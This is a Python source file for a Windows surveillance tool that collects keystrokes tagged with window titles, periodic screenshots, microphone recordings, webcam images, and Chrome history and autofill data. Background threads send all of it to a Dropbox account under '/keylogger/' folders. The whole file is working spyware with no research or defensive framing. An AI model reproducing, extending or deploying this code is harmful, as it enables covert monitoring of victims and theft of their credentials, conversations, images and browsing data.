import os
import sys
import time
import threading
import io
import ctypes
from pynput import keyboard
from PIL import ImageGrab
from dropbox.files   import WriteMode
from dropbox import Dropbox
from encrypt import encrypt_bytes, decrypt_bytes
import wave
import pyaudio
import cv2
import chrome_extractor

#dropbox_credentials
APP_KEY          = os.getenv("APP_KEY")
APP_SECRET       = os.getenv("APP_SECRET")
REFRESH_TOKEN    = os.getenv("REFRESH_TOKEN")

#intervals
KEYSTROKE_INTERVAL = 30
SCREENSHOT_INTERVAL = 5
AUDIO_INTERVAL      = 15
WEBCAM_INTERVAL = 10

#directories
BASE = os.path.dirname(sys.executable)

SESSION_START_TIME = time.strftime("%d%m%Y-%H%M%S")

dbx = Dropbox(
    oauth2_refresh_token=REFRESH_TOKEN,
    app_key=APP_KEY,
    app_secret=APP_SECRET
)

class Keylogger():
    def __init__(self, dbx, dropbox_log_path, interval):
        self.KEYLOGS_DIR = os.path.join(BASE, "keylogs")
        os.makedirs(self.KEYLOGS_DIR, exist_ok=True)
        self.dbx = dbx
        self.dropbox_log_path = dropbox_log_path
        self.interval = interval
        self.completed_lines = []
        self.current_line = ""
        self.line_window = ""
        self.last_window = ""
        self.user32 = ctypes.windll.user32
        self.keystate = self.user32.GetKeyState
        self.VK_SHIFT = 0x10
        self.VK_CAPITAL = 0x14

    def is_shift(self):
        value = self.keystate(self.VK_SHIFT) & 0x8000
        return bool (value)

    def is_caps(self):
        value = self.keystate(self.VK_CAPITAL) & 1
        return value

    def get_window_title(self):
        id = self.user32.GetForegroundWindow()
        length = self.user32.GetWindowTextLengthW(id)
        buffer = ctypes.create_unicode_buffer(length + 1)
        self.user32.GetWindowTextW(id, buffer, length + 1)
        return buffer.value or "untitled"
    
    def on_press(self, key):
        current_time = time.strftime("%d-%m-%Y-%H:%M:%S")
        current_win = self.get_window_title()

        if current_win != self.last_window:
            if self.current_line:
                self.completed_lines.append(f"[{current_time}] [Window: {self.last_window}] {self.current_line}")
                self.current_line = ""
            self.last_window = current_win

        if key == keyboard.Key.backspace:
            self.current_line = self.current_line[:-1]
            return
        
        if key == keyboard.Key.enter:
            self.completed_lines.append(f"[{current_time}] [Window: {current_win}] {self.current_line}")
            self.current_line = ""
            return
        
        if hasattr(key, 'char') and key.char:
            original = key.char
            if original.isalpha():
                shift = self.is_shift()
                caps  = self.is_caps()
                if shift ^ caps:
                    char = original.upper()
                else:
                    char = original.lower()
            else:
                char = original
        else:
            if key == keyboard.Key.space:
                char = ' '
            elif key == keyboard.Key.shift:
                char = ''
            elif key == keyboard.Key.caps_lock:
                char = ''
            elif key == keyboard.Key.tab:
                char = '\t'
            elif key == keyboard.Key.esc:
                char = '[ESC]'
            else:
                name = getattr(key, 'name', str(key))
                char = f"<{name}>"
        self.current_line += char

    def upload_log(self):
        while True:
            time.sleep(self.interval)
            try:
                _, result = dbx.files_download(self.dropbox_log_path)
                existing = result.content
            except Exception:
                existing = b""

            for file in os.listdir(self.KEYLOGS_DIR):
                path = os.path.join(self.KEYLOGS_DIR, file)
                encrypted = open(path, "rb").read()
                decrypted = decrypt_bytes(encrypted)
                try:
                    new_content = existing + decrypted
                    dbx.files_upload(new_content,self.dropbox_log_path,mode=WriteMode.overwrite)
                    os.remove(path)
                except Exception as e:
                    continue

            if self.current_line:
                current_time = time.strftime("%d-%m-%Y-%H:%M:%S")
                self.completed_lines.append(f"[{current_time}] [Window: {self.last_window}] {self.current_line}")
                self.current_line = ""

            if not self.completed_lines:
                continue

            text = "\n".join(self.completed_lines).encode("utf-8")
            self.completed_lines.clear()
            encrypted_data = encrypt_bytes(text)
            timestamp = time.strftime("%d-%m-%Y-%H-%M-%S")
            path = os.path.join(self.KEYLOGS_DIR,f"{timestamp}.enc")
            with open(path, "wb") as f:
                f.write(encrypted_data)
            try:
                decrypted = decrypt_bytes(encrypted_data)
                new_content = existing + decrypted
                dbx.files_upload(new_content,self.dropbox_log_path,mode=WriteMode.overwrite)
                os.remove(path)
                print(f"Uploaded keylogs to {self.dropbox_log_path} at {timestamp}")

            except Exception as e:
                print(f"Upload failed for {path}: {e}")
                continue
        
def webcam_grabber():
    WEBCAM_DIR = os.path.join(BASE, "webcam_enc")
    os.makedirs(WEBCAM_DIR, exist_ok=True)
    while True:
        time.sleep(WEBCAM_INTERVAL)
        for file in os.listdir(WEBCAM_DIR):
            path = os.path.join(WEBCAM_DIR, file)
            encrypted = open(path, "rb").read()
            decrypted = decrypt_bytes(encrypted)
            timestamp = time.strftime("%d-%m-%Y-%H-%M-%S")
            dropbox_webcam_path = f"/keylogger/webcam/{SESSION_START_TIME}-{timestamp}.jpg"
            try:
                dbx.files_upload(decrypted, dropbox_webcam_path)
                os.remove(path)
            except Exception as e:
                print(f"Retry upload failed")
                continue
        camera = cv2.VideoCapture(0)
        if not camera.isOpened():
            continue
        ret, frame = camera.read()
        camera.release()
        if not ret:
            continue
        success, image = cv2.imencode('.jpg', frame)
        if not success:
            continue
        bytes = image.tobytes()
        encrypted = encrypt_bytes(bytes)
        timestamp = time.strftime("%d-%m-%Y-%H-%M-%S")
        path = os.path.join(WEBCAM_DIR, f"{timestamp}.enc")
        with open(path, "wb") as f:
            f.write(encrypted)
        try:
            decrypted = decrypt_bytes(encrypted)
            drop_webcam_path = f"/keylogger/webcam/{SESSION_START_TIME}-{timestamp}.jpg"
            dbx.files_upload(decrypted, drop_webcam_path)
            print(f"Image uploaded to {drop_webcam_path} at {timestamp}")
            os.remove(path)
        except Exception as e:
            print(f"Upload failed: {e}")
            continue


def screenshot_grabber():
    SS_DIR = os.path.join(BASE, "screenshots_enc")
    os.makedirs(SS_DIR, exist_ok=True)
    while True:
        time.sleep(SCREENSHOT_INTERVAL)

        for file in os.listdir(SS_DIR):
            path = os.path.join(SS_DIR, file)
            encrypted = open(path, "rb").read()
            image = decrypt_bytes(encrypted)
            timestamp = time.strftime("%d-%m-%Y-%H-%M-%S")
            drop_ss_path = f"/keylogger/screenshots/{SESSION_START_TIME}-{timestamp}.jpg"
            try:
                dbx.files_upload(image, drop_ss_path)
                os.remove(path)
            except Exception as e:
                print(f"Retry upload failed: {e}")
                continue

        img = ImageGrab.grab()
        buffer = io.BytesIO()
        img.save(buffer, format="JPEG", quality=70)
        jpeg = buffer.getvalue()

        encrypted = encrypt_bytes(jpeg)
        timestamp = time.strftime("%d-%m-%Y-%H-%M-%S")
        path = os.path.join(SS_DIR, f"{SESSION_START_TIME}-{timestamp}.enc")
        with open(path, "wb") as f:
            f.write(encrypted)
        try:
            image = decrypt_bytes(encrypted)
            drop_ss_path = f"/keylogger/screenshots/{SESSION_START_TIME}-{timestamp}.jpg"
            dbx.files_upload(image, drop_ss_path)
            print(f"Screenshot uploaded to {drop_ss_path}")
            os.remove(path)
        except Exception as e:
            print(f"Screenshot upload failed: {e}")
            continue

def mic_recorder():
    AUDIO_CHUNK = 1024
    AUDIO_FORMAT = pyaudio.paInt16
    AUDIO_CHANNELS = 1
    AUDIO_RATE = 44400
    pa = pyaudio.PyAudio()
    stream = pa.open(format=AUDIO_FORMAT,channels=AUDIO_CHANNELS,rate=AUDIO_RATE,input=True,frames_per_buffer=AUDIO_CHUNK)

    AUDIO_DIR = os.path.join(BASE, "audio_enc")
    os.makedirs(AUDIO_DIR, exist_ok=True)

    while True:
        for file in os.listdir(AUDIO_DIR):
            path = os.path.join(AUDIO_DIR, file)
            encrypted = open(path, "rb").read()
            audio = decrypt_bytes(encrypted)
            timestamp = time.strftime("%d-%m-%Y-%H-%M-%S")
            drop_audio_path = f"/keylogger/audio/{SESSION_START_TIME}-{timestamp}.wav"
            try:
                dbx.files_upload(audio, drop_audio_path)
                os.remove(path)
            except Exception as e:
                print(f"Retry upload failed: {e}")
                continue
        frames = []
        for i in range(0, int(AUDIO_RATE / AUDIO_CHUNK * AUDIO_INTERVAL)):
            data = stream.read(AUDIO_CHUNK)
            frames.append(data)

        buffer = io.BytesIO()
        sf = wave.open(buffer, 'wb')
        sf.setnchannels(AUDIO_CHANNELS)
        sf.setsampwidth(pa.get_sample_size(AUDIO_FORMAT))
        sf.setframerate(AUDIO_RATE)
        sf.writeframes(b''.join(frames))
        sf.close()
        audio_bytes = buffer.getvalue()

        encrypted = encrypt_bytes(audio_bytes)
        timestamp = time.strftime("%d-%m-%Y-%H-%M-%S")    
        path = os.path.join(AUDIO_DIR, f"{timestamp}.enc")
        with open(path, 'wb') as f:
            f.write(encrypted)
        try:
            decrypted = decrypt_bytes(encrypted)
            drop_audio_path = f"/keylogger/audio/{SESSION_START_TIME}-{timestamp}.wav"
            dbx.files_upload(decrypted, drop_audio_path)
            print(f"Audio uploaded to {drop_audio_path}")
            os.remove(path)
        except Exception as e:
            print(f"Audio upload failed: {e}")
        time.sleep(0.1)

def do_extraction():

    user_data_directory = chrome_extractor.user_data_dir()
    profiles = chrome_extractor.find_profiles(user_data_directory)
    CSV_OUT = os.path.join(BASE, "chrome_data")
    os.makedirs(CSV_OUT, exist_ok=True)

    for profile, prof_dir in profiles:

        profile_name = profile.lower().replace(" ", "_")
        profile_path = os.path.join(CSV_OUT, profile_name)
        os.makedirs(profile_path, exist_ok=True)

        chrome_extractor.extract_history(os.path.join(prof_dir, "History"),os.path.join(profile_path, "history.csv"))
        chrome_extractor.extract_top_sites(os.path.join(prof_dir, "Top Sites"),os.path.join(profile_path, "top_sites.csv"))
        chrome_extractor.extract_autofill(os.path.join(prof_dir, "Web Data"),os.path.join(profile_path, "autofill.csv"))
        
        for file in os.listdir(profile_path):
            path = os.path.join(profile_path, file)
            drop_csv_path = f"/keylogger/csv/{profile_name}/{file}"
            with open(path, "rb") as f:
                dbx.files_upload(f.read(), drop_csv_path, mode=WriteMode.overwrite)
            print(f"Uploaded {profile_name}|{file} to {drop_csv_path}")

def main():
    keylog = Keylogger(dbx, f"/keylogger/{SESSION_START_TIME}_keylog.txt", KEYSTROKE_INTERVAL)
    do_extraction()

    
    listener = keyboard.Listener(on_press=keylog.on_press)
    listener.start()
    
    threading.Thread(target=keylog.upload_log, daemon=True).start()
    threading.Thread(target=screenshot_grabber, daemon=True).start()
    threading.Thread(target=mic_recorder, daemon=True).start()
    threading.Thread(target=webcam_grabber, daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        listener.stop()
        sys.exit(0)

if __name__ == "__main__":
    main()
